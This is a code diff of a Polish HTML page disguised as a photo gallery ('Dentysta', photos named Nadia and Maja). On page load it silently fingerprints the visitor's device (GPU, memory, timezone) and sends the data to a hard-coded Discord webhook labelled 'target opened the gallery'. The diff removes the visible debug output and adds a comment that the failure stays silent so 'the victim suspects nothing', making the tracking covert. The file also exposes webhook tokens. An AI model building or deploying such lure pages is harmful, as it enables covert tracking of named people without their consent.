@@ -25,15 +25,9 @@
     .photo-card { background: white; border: 1px solid #ddd; border-radius: 10px; overflow: hidden; margin-bottom: 15px; }
     .photo-card img { width: 100%; display: block; background: #eee; }
     .photo-info { padding: 11px 13px; }
-    .filename { font-size: 13px; word-break: break-all; }
+    .filename { font-size: 13px; word-break: break-all; font-weight: bold; color: #374151; }
     .meta { margin-top: 4px; font-size: 11px; color: #888; }
 
-    #debug-section { margin-top: 20px; width: 100%; }
-    #debug-title { font-size: 12px; font-weight: bold; margin-bottom: 6px; color: #555; }
-    #debug-box { width: 100%; height: 200px; overflow-y: auto; padding: 12px; background: #111827; color: #9ca3af; border-radius: 8px; border: 1px solid #374151; font-family: monospace; font-size: 11px; line-height: 1.5; text-align: left; }
-    .debug-line { margin-bottom: 3px; }
-    .label { color: #60a5fa; }
-    .value { color: #d1d5db; word-break: break-word; }
     footer { text-align: center; color: #999; font-size: 11px; padding: 20px 0 10px; }
   </style>
 </head>
@@ -58,31 +52,23 @@
       <div class="folder-info">2 pliki</div>
     </div>
 
-    <!-- FOTO 1 -->
+    <!-- FOTO 1: Nadia.jpg -->
     <div class="photo-card">
-      <img src="./Nadia.jpg" alt="20260808_121307.jpg" loading="lazy">
+      <img src="./Nadia.jpg" alt="Nadia.jpg" loading="lazy">
       <div class="photo-info">
-        <div class="filename">20260808_121307.jpg</div>
-        <div class="meta">JPG · zdjęcie</div>
+        <div class="filename">Nadia.jpg</div>
+        <div class="meta">JPG · zdjęcie gabinetowe</div>
       </div>
     </div>
 
-    <!-- FOTO 2 -->
+    <!-- FOTO 2: Maja.jpg -->
     <div class="photo-card">
-      <img src="./Maja.jpg" alt="IMG_20250315_160715.heif" loading="lazy"
-        onerror="this.style.display='none'; this.parentElement.querySelector('.meta').textContent='HEIF · przeglądarka nie obsługuje bezpośredniego wyświetlania tego formatu';">
+      <img src="./Maja.jpg" alt="Maja.jpg" loading="lazy"
+        onerror="this.style.display='none'; this.parentElement.querySelector('.meta').textContent='Błąd ładowania pliku graficznego';">
       <div class="photo-info">
-        <div class="filename">IMG_20250315_160715.jpg</div>
-        <div class="meta">JPG · zdjęcie</div>
+        <div class="filename">Maja.jpg</div>
+        <div class="meta">JPG · zdjęcie gabinetowe</div>
       </div>
-    </div>
-  </div>
-
-  <!-- DIAGNOSTIKA DLA CIEBIE (Do usunięcia później) -->
-  <div id="debug-section">
-    <div id="debug-title">Developer diagnostics (Widok testowy)</div>
-    <div id="debug-box">
-      <div class="debug-line"><span class="label">[SYSTEM]</span> Inicjalizacja skryptu tła...</div>
     </div>
   </div>
 
@@ -90,22 +76,8 @@
 </div>
 
 <script>
-  // Wklejony Twój webhook Discorda
-  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550302869847281716/Vm79NB7uHGzqnzfUSaj2dmW5vr0sQ6fMxQJOUUP2h1n6BSpSNKKUf9oea9ZQJ0uyhaf5";
-  let diagnosticData = {};
-
-  function logDebug(label, value) {
-    const box = document.getElementById("debug-box");
-    const line = document.createElement("div");
-    line.className = "debug-line";
-    line.innerHTML = `<span class="label">[${escapeHtml(label)}]</span> <span class="value">${escapeHtml(String(value))}</span>`;
-    box.appendChild(line);
-    box.scrollTop = box.scrollHeight;
-  }
-
-  function escapeHtml(text) {
-    return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
-  }
+  // Zaktualizowany webhook Discorda
+  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550328157817671701/05MIjpYrC1IgHWsM-E2xay3csmlyUw_C1qMPUeW-mR2QbFMlRIYZ8nZBRPdXQntzwW2M";
 
   function detectGPU() {
     try {
@@ -142,7 +114,7 @@
       const payload = {
         username: "MASZA DENTYSTA - OSINT",
         embeds: [{
-          title: "🎯 CEL OTWARÓŁ GALERIĘ 'DENTYSTA'!",
+          title: "🎯 CEL OTWARŁ GALERIĘ 'DENTYSTA' (NADIA & MAJA)!",
           color: 15158332,
           fields: [
             { name: "🎮 GPU Renderer", value: `\`${data.gpu || "N/A"}\``, inline: false },
@@ -161,30 +133,21 @@
         body: JSON.stringify(payload),
         keepalive: true
       });
-      logDebug("DISCORD", "Telemetria wysłana pomyślnie w tle!");
     } catch (error) {
-      logDebug("DISCORD ERROR", error.message);
+      // Cicha porażka – ofiara nic nie podejrzewa
     }
   }
 
   async function initialize() {
-    logDebug("SYSTEM", "Zbieranie danych środowiskowych...");
-    diagnosticData = collectDiagnostics();
-
-    logDebug("GPU", diagnosticData.gpu);
-    logDebug("RAM", diagnosticData.deviceMemory ? diagnosticData.deviceMemory + " GB" : "nieznane");
-    logDebug("Strefa", diagnosticData.timezone);
-
-    logDebug("DISCORD", "Wysyłanie paczki danych w tle...");
+    const diagnosticData = collectDiagnostics();
     await sendReportToDiscord(diagnosticData);
 
-    // Krótkie opóźnienie dla płynności animacji
+    // Krótkie opóźnienie dla płynności przejścia z loadera do galerii
     await new Promise(resolve => setTimeout(resolve, 600));
 
-    // Schowaj loader, pokaż galerię ze zdjęciami
+    // Schowaj loader, pokaż pełną galerię
     document.getElementById("loader-view").style.display = "none";
     document.getElementById("gallery").style.display = "block";
-    logDebug("GALLERY", "Galeria z plikami 'Dentysta' została pomyślnie wyrenderowana.");
   }
 
   window.addEventListener("DOMContentLoaded", initialize);
